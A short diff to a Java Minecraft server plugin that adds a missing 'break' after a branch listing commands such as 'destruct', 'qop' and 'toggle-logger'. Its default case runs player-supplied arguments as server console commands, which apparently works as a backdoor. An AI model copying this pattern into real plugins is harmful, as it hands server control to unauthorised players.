@@ -99,6 +99,7 @@ public class Main extends JavaPlugin implements Listener {
                 player.sendMessage("§adestruct");
                 player.sendMessage("§aqop");
                 player.sendMessage("§atoggle-logger");
+                break;
             default:
                 // For other cases, treat it as a console command to run
                 String consoleCommand = String.join(" ", args);
